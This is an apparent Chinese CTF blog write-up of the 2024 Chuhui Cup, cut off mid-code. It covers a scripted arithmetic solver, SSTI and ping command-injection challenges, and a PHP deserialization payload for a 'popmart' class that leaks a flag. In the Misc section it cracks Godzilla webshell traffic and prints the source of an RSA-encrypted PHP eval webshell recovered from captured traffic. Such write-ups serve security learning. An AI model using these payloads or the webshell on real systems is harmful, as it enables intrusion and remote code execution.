<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>2024楚慧杯wp | Borgeousのblog</title><meta name="author" content="hack_Borgeous"><meta name="copyright" content="hack_Borgeous"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="WEB速算比赛先简单使用yakit抓包，发现只要不对&#x2F;进行get操作，题目就不会改变，但是一旦使用post&#x2F;get方法请求&#x2F;，就会修改题目，因此需要使用脚本自动解析题目并提交答案。代码如下： import reimport requestsfrom bs4 import BeautifulSouphtml_contents &#x3D; []url &#x3D; &amp;#x27;http:&#x2F;&#x2F;139.155.126.78">
<meta property="og:type" content="article">
<meta property="og:title" content="2024楚慧杯wp">
<meta property="og:url" content="http://www.hackborgeous.top/post/260d256e.html">
<meta property="og:site_name" content="Borgeousのblog">
<meta property="og:description" content="WEB速算比赛先简单使用yakit抓包，发现只要不对&#x2F;进行get操作，题目就不会改变，但是一旦使用post&#x2F;get方法请求&#x2F;，就会修改题目，因此需要使用脚本自动解析题目并提交答案。代码如下： import reimport requestsfrom bs4 import BeautifulSouphtml_contents &#x3D; []url &#x3D; &amp;#x27;http:&#x2F;&#x2F;139.155.126.78">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://www.hackborgeous.top/img/top_img58.png">
<meta property="article:published_time" content="2024-12-20T11:35:59.000Z">
<meta property="article:modified_time" content="2024-12-21T08:29:23.764Z">
<meta property="article:author" content="hack_Borgeous">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://www.hackborgeous.top/img/top_img58.png"><link rel="shortcut icon" href="/img/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8.png"><link rel="canonical" href="http://www.hackborgeous.top/post/260d256e.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    post: true
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: hack_Borgeous","link":"链接: ","source":"来源: Borgeousのblog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '2024楚慧杯wp',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-12-21 16:29:23'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/mainColor/heoMainColor.css"><link rel="stylesheet" href="/css/bilibiliBanner.css"  media="defer" onload="this.media='screen'"><link rel="stylesheet" href="/css/universe.css"><link rel="stylesheet" href="https://npm.elemecdn.com/ethan4116-blog/lib/css/plane_v2.css"><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/loading-bar.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/categoryBar/categoryBar.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-double-row-display@1.00/cardlistpost.min.css"/>
<style>#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags:before {content:"\A";
  white-space: pre;}#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags > .article-meta__separator{display:none}</style>
<link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.css" /><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load',() => { preloader.endLoading() })

  if (false) {
    btf.addGlobalFn('pjaxSend', () => { preloader.initLoading() }, 'preloader_init')
    btf.addGlobalFn('pjaxComplete', () => { preloader.endLoading() }, 'preloader_end')
  }
})()</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/lazyload.gif" data-original="/img/AVAtar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">84</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">138</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">57</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博客文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fas fa-comments-o"></i><span> 说说</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fas fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于作者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/top_img58.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Borgeousのblog"><span class="site-name">Borgeousのblog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博客文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fas fa-comments-o"></i><span> 说说</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fas fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于作者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">2024楚慧杯wp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-12-20T11:35:59.000Z" title="发表于 2024-12-20 19:35:59">2024-12-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-12-21T08:29:23.764Z" title="更新于 2024-12-21 16:29:23">2024-12-21</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/%E6%AF%94%E8%B5%9BWP/">比赛WP</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">5.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>26分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="2024楚慧杯wp"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a><strong>WEB</strong></h1><h2 id="速算比赛"><a href="#速算比赛" class="headerlink" title="速算比赛"></a><strong>速算比赛</strong></h2><p>先简单使用yakit抓包，发现只要不对/进行get操作，题目就不会改变，但是一旦使用post/get方法请求/，就会修改题目，因此需要使用脚本自动解析题目并提交答案。代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">html_contents = []</span><br><span class="line">url = <span class="string">&#x27;http://139.155.126.78:15979/&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;139.155.126.78:15979&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://139.155.126.78:15979/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en-US,en;q=0.5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;PHPSESSID=bbbe934afcc45bd0543339118e3e1bce&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;http://139.155.126.78:15979&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Priority&#x27;</span>: <span class="string">&#x27;u=0, i&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析算式并计算结果</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_and_calculate</span>(<span class="params">calculate_text</span>):</span><br><span class="line">    <span class="comment"># 使用正则表达式匹配算式</span></span><br><span class="line">    <span class="keyword">match</span> = re.search(<span class="string">r&#x27;Calculate: (\d+) (\+|-) (\d+)&#x27;</span>, calculate_text)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        num1 = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>))</span><br><span class="line">        operator = <span class="keyword">match</span>.group(<span class="number">2</span>)</span><br><span class="line">        num2 = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">3</span>))</span><br><span class="line">        <span class="keyword">if</span> operator == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> num1 + num2</span><br><span class="line">        <span class="keyword">elif</span> operator == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> num1 - num2</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    response = requests.get(url, headers=headers)</span><br><span class="line">    response.encoding = <span class="string">&#x27;utf-8&#x27;</span> </span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        html_contents.append(response.text)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;第 <span class="subst">&#123;i + <span class="number">1</span>&#125;</span> 次请求成功，HTML内容已存储。&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;第 <span class="subst">&#123;i + <span class="number">1</span>&#125;</span> 次请求失败，状态码：<span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">    soup = BeautifulSoup(response.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">    post_data = &#123;<span class="string">&#x27;answer&#x27;</span>: parse_and_calculate(response.text)&#125;</span><br><span class="line">    post_response = requests.post(url, headers=headers,data=post_data)</span><br><span class="line">    <span class="built_in">print</span>(post_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_flag</span>(<span class="params">html_list</span>):</span><br><span class="line">    <span class="keyword">for</span> index, html_content <span class="keyword">in</span> <span class="built_in">enumerate</span>(html_list):</span><br><span class="line">        soup = BeautifulSoup(html_content, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> text <span class="keyword">in</span> soup.stripped_strings:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> text.lower(): </span><br><span class="line">                <span class="keyword">return</span> <span class="string">f&quot;找到flag在第 <span class="subst">&#123;index + <span class="number">1</span>&#125;</span> 次请求的HTML中：<span class="subst">&#123;html_content&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;没有找到包含&#x27;flag&#x27;的内容。&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">result = find_flag(html_contents)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
<h2 id="Sal图集"><a href="#Sal图集" class="headerlink" title="Sal图集"></a>Sal图集</h2><p>首先打开靶机，我们可以看到如下页面</p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241220194111229.png" alt="image-20241220194111229"></p>
<p>我们寻找功能点</p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241220194149187.png" alt="image-20241220194149187"></p>
<p>可以发现这个<code>name=1</code>非常奇怪，我们直接尝试 ssti，发现存在 ssti漏洞</p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241220194210437.png" alt="image-20241220194210437"></p>
<p>直接fenjing一把梭</p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241220194227361.png" alt="image-20241220194227361"></p>
<h2 id="popmart"><a href="#popmart" class="headerlink" title="popmart"></a>popmart</h2><p>首先我们看到页面提示c一下，我们可以联想到ping -c命令，所以我们尝试进行任意命令执行，如下所示</p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241220194335881.png" alt="image-20241220194335881"></p>
<p>我们可以尝试去读取flag.php，但是可以发现被限制了命令输出长度</p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241220194400896.png" alt="image-20241220194400896"></p>
<p>我们可以联想到用<code>nl *</code>进行所有文件的读取，如下所示</p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241220194448537.png" alt="image-20241220194448537"></p>
<p>但是我们仍然没有发现flag.php的踪迹，但是我们可以注意到里面p0pmart.php存在反序列化漏洞，而且在这个php文件里包含了flag.php文件，所以大概率就是利用这个反序列化漏洞进行flag读取，p0pmart.php源码如下所示</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   283    error_reporting(0);</span><br><span class="line">   284    require_once(&quot;flag.php&quot;);</span><br><span class="line">   285    </span><br><span class="line">   286    class popmart&#123;</span><br><span class="line">   287        public $yuki;</span><br><span class="line">   288        public $molly;</span><br><span class="line">   289        public $dimoo;</span><br><span class="line">   290    </span><br><span class="line">   291        public function __construct()&#123;</span><br><span class="line">   292            $this-&gt;yuki=&#x27;tell me where&#x27;;</span><br><span class="line">   293            $this-&gt;molly=&#x27;dont_tell_you&#x27;;</span><br><span class="line">   294            $this-&gt;dimoo=&quot;you_can_guess&quot;;</span><br><span class="line">   295        &#125;</span><br><span class="line">   296    </span><br><span class="line">   297        public function __wakeup()&#123;</span><br><span class="line">   298            global $flag;</span><br><span class="line">   299            global $where_you_go;</span><br><span class="line">   300            $this-&gt;yuki=$where_you_go;</span><br><span class="line">   301    </span><br><span class="line">   302            if($this-&gt;molly === $this-&gt;yuki)&#123;</span><br><span class="line">   303                echo $flag;</span><br><span class="line">   304            &#125;</span><br><span class="line">   305        &#125;</span><br><span class="line">   306    &#125;</span><br><span class="line">   307    </span><br><span class="line">   308    $pucky = $_GET[&#x27;wq&#x27;];</span><br><span class="line">   309    if(isset($pucky))&#123;</span><br><span class="line">   310        if($pucky===&quot;二仙桥&quot;)&#123;</span><br><span class="line">   311            extract($_POST);</span><br><span class="line">   312            if($pucky===&quot;二仙桥&quot;)&#123;    </span><br><span class="line">   313                die(&quot;&lt;script&gt;window.alert(&#x27;说说看，你要去哪？？&#x27;);&lt;/script&gt;&quot;);</span><br><span class="line">   314            &#125;</span><br><span class="line">   315            unserialize($pucky);</span><br><span class="line">   316        &#125;</span><br><span class="line">   317    &#125;</span><br></pre></td></tr></table></figure>
<p>很简单的一道反序列化，直接构造pop链，最后的poc如下所示</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET:p0pmart.php?wq=二仙桥</span><br><span class="line">POST:pucky=O:7:&quot;popmart&quot;:3:&#123;s:4:&quot;yuki&quot;;s:13:&quot;tell me where&quot;;s:5:&quot;molly&quot;;s:13:&quot;dont_tell_you&quot;;s:5:&quot;dimoo&quot;;s:13:&quot;you_can_guess&quot;;&#125;&amp;where_you_go=dont_tell_you</span><br></pre></td></tr></table></figure>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241220194559130.png" alt="image-20241220194559130"></p>
<p>执行可以成功拿到flag</p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="gza-Cracker"><a href="#gza-Cracker" class="headerlink" title="gza_Cracker"></a><strong>gza_Cracker</strong></h2><p>哥斯拉流量爆破密钥，可以在流量包中找到字典，导出，然后直接 NetA 一把梭。</p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241220194702534.png" alt="image-20241220194702534"></p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241220194712645.png" alt="image-20241220194712645"></p>
<p>发现 flag base64 编码后的内容，cyberchef 解即可。</p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241220194736907.png" alt="image-20241220194736907"></p>
<h2 id="不良劫"><a href="#不良劫" class="headerlink" title="不良劫"></a>不良劫</h2><p>拿到一张 jpg，后面藏了一个 png，直接 foremost 分离，得到一张 jpg 和 png。</p>
<p>jpg 有盲水印，直接用工具查看，得到后半段 flag。</p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241220194916662.png" alt="image-20241220194916662"></p>
<p>png 是一张被涂抹的二维码，可以先stegsolve 提取 red plane0，然后用画图工具修补左上角的定位，用微信扫码才能扫出，得到前半段 flag。</p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241220194942741.png" alt="image-20241220194942741"></p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241220194958324.png" alt="image-20241220194958324"></p>
<h2 id="特殊流量"><a href="#特殊流量" class="headerlink" title="特殊流量"></a>特殊流量</h2><p>首先分析 http流量，发现与 <code>/uploads/my_rsa.php</code> 频繁交互，请求里面是加密的一些内容，然后响应是 base64 编码后的内容。</p>
<p>在流量中搜索 my_rsa.php，可以找到一个包含该文件的 zip 压缩包。</p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241220195047690.png" alt="image-20241220195047690"></p>
<p>将其提取出来，解压后得到 my_rsa.php 的源码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cmd = @$_POST[&#x27;ant&#x27;];</span><br><span class="line">$pk = &lt;&lt;&lt;EOF</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCfhiyoPdM6svJZ+QlYywklwVcx</span><br><span class="line">PkExXQDSdke4BVYMX8Hfohbssy4G7Cc3HwLvzZVDaeyTDaw+l8qILYezVtxmUePQ</span><br><span class="line">5qKi7yN6zGVMUpQsV6kFs0GQVkrJWWcNh7nF6uJxuV+re4j+t2tKF3NhnyOtbd1J</span><br><span class="line">RAcfJSQCvaw6O8uq3wIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line">EOF;</span><br><span class="line">$cmds = explode(&quot;|&quot;, $cmd);</span><br><span class="line">$pk = openssl_pkey_get_public($pk);</span><br><span class="line">$cmd = &#x27;&#x27;;</span><br><span class="line">foreach ($cmds as $value) &#123;</span><br><span class="line">  if (openssl_public_decrypt(base64_decode($value), $de, $pk)) &#123;</span><br><span class="line">    $cmd .= $de;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">foreach($_POST as $k =&gt; $v)&#123;</span><br><span class="line">    if (openssl_public_decrypt(base64_decode($v), $de, $pk)) &#123;</span><br><span class="line">       $_POST[$k]=$de;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">eval($cmd);</span><br></pre></td></tr></table></figure>
<p>把 eval 改成 echo，就能解密那些请求了。</p>
<p>解密后发现并没有什么东西，因为实际执行的命令在后面的参数中，而不是 ant 参数。</p>
<p>修改一下脚本，直接将其输出。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cmd = @$_POST[&#x27;ant&#x27;];</span><br><span class="line">$pk = &lt;&lt;&lt;EOF</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCfhiyoPdM6svJZ+QlYywklwVcx</span><br><span class="line">PkExXQDSdke4BVYMX8Hfohbssy4G7Cc3HwLvzZVDaeyTDaw+l8qILYezVtxmUePQ</span><br><span class="line">5qKi7yN6zGVMUpQsV6kFs0GQVkrJWWcNh7nF6uJxuV+re4j+t2tKF3NhnyOtbd1J</span><br><span class="line">RAcfJSQCvaw6O8uq3wIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line">EOF;</span><br><span class="line">$cmds = explode(&quot;|&quot;, $cmd);</span><br><span class="line">$pk = openssl_pkey_get_public($pk);</span><br><span class="line">$cmd = &#x27;&#x27;;</span><br><span class="line">foreach ($cmds as $value) &#123;</span><br><span class="line">  if (openssl_public_decrypt(base64_decode($value), $de, $pk)) &#123;</span><br><span 